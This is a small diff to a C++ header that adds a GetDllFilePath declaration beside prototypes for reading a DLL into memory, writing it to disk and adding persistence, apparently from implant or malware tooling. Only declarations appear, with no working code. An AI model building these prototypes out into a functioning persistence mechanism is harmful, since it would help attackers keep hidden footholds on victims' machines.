@@ -18,6 +18,7 @@ typedef struct {
 
 } PERSIST_STRUCT, *PPERSIST_STRUCT;
 
+std::string GetDllFilePath( std::string file_name, boolean isAdmin );
 bool ReadDllIntoMemory( PERSIST_STRUCT *persist_ptr );
 bool WriteDllToDisk( PERSIST_STRUCT *persist_ptr );
 bool AddPersistence( PERSIST_STRUCT *persist_ptr );
